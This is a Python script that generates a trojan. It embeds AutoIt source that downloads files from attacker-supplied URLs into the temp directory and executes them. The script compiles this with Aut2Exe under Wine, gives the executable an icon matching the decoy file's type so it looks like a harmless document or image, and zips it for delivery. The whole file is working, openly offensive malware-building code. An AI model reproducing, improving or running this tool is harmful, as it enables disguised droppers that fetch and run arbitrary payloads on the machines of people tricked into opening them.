#!/usr/bin/env python
import subprocess
import os
import zipfile



TROJAN_SOURCE_CODE_FILE = "trojan.txt"
AUT2EXE = "/root/.wine/drive_c/Program Files (x86)/AutoIt3/Aut2Exe/Aut2exe.exe"

trojan_code = """
#include <StaticConstants.au3>
#include <WindowsConstants.au3>
Local $urlsArray = StringSplit($urls, ",", 2 )
For $url In $urlsArray
	$sFile = _DownloadFile($url)
	shellExecute($sFile)
Next
Func _DownloadFile($sURL)
    Local $hDownload, $sFile
    $sFile = StringRegExpReplace($sURL, "^.*/", "")
    $sFile = StringReplace($sFile, "#", "")
    $sDirectory = @TempDir & $sFile
    $hDownload = InetGet($sURL, $sDirectory, 17, 1)
    InetClose($hDownload)
    Return $sDirectory
EndFunc   ;==>_GetURLImage
"""

class Trojan:

	def __init__(self, url1, url2, icon):
		self.url1 = url1
		self.url2 = url2
		file_type = url1.split(".")[-1].replace("#", "")
		self.icon = self.set_icon(icon, file_type)
		
					
	def create(self):
		urls = 'Local $urls = "' +  self.url1 + "," +self.url2 + '"\n'
		with open(TROJAN_SOURCE_CODE_FILE, "w") as trojan_file:
			trojan_file.write(urls + trojan_code)

	def compile(self, out_file):
		subprocess.call('wine "' + AUT2EXE + '" /In "' + TROJAN_SOURCE_CODE_FILE + '" /Out "' + out_file +'" /Icon "' + self.icon + '"' , shell=True)
	
	def set_icon(self, icon, file_type):
		icons_directory = os.path.dirname(os.path.realpath(__file__)) + "/icons"
		if icon == None:
			icon = icons_directory + "/" + file_type + ".ico"
		print(icon)
		if not os.path.isfile(icon) :
			print("[-] Can't find icon at " + icon)
			print("[-] Using generaic icon.")
			icon = icons_directory + "/generic.ico"
		return icon

	
	def zip(self, out_file):
		os.chdir(os.path.dirname(out_file))
		trojan_name = out_file.split("/")[-1]
		zip_name = trojan_name.split(".")[0]
		zipfile.ZipFile(zip_name + ".zip", mode="w").write(trojan_name)

